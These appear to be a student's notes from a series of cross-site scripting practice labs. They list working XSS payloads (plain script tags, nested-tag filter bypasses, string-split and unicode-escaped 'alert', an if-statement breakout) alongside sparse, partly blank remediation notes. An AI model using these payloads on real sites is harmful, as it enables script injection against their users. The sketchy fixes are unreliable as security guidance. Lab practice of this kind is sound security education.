Lab01

?name=<script>alert("this is an alert")</script>

Lab02

?name=<<script>script>alert("this is an alert")<</script>/script>

Lab03
X
?name=<<script>script>alert("this is an alert")<</script>/script>

Lab04

<script>top[“al”+”ert”]("thisisanale%20rt")</script>test

Lab05

?name=<script>al\u0065rt("thisisanale%20rt")</script>test

Lab06

<script>alert("This is an alert")</script>
Lab07

show error: ?x=1#<script>console.log("This is an alrt")</script>

fix:        normal sanitisation, sanitise '<', '>', 'script' etc....

Lab08

show error: Put into the text box: "<script><script>alert("This is an alert")</script></script>"
Example of not escaping quotes. filter had removed script tags once but didn't check again. put script tags in twice one after another both opening and closing and enclose entire thing in quotes.

fix:    

Lab09

check for quote characters and escape appropriately

show error: ?number=1===1){alert("caution")}</script><script>if(1
variable passed is being used as a boundary in a if else or switch statement. this can be exploited as the variable is being passed as text and can insert new pieces of <script>

fix:    sanitise first as above ^
Lab10

***(applied filter to lab10.php as it was a duplicate of lab 8)***

used show error from lab 8 and modified: "<script><script>alert("This is an alrt")</script></script>"


printing in once prints '">' outside of text box so placing it once inside the textbox deleting last ">" and then printing in full will allow the script to run

fix:
Lab11
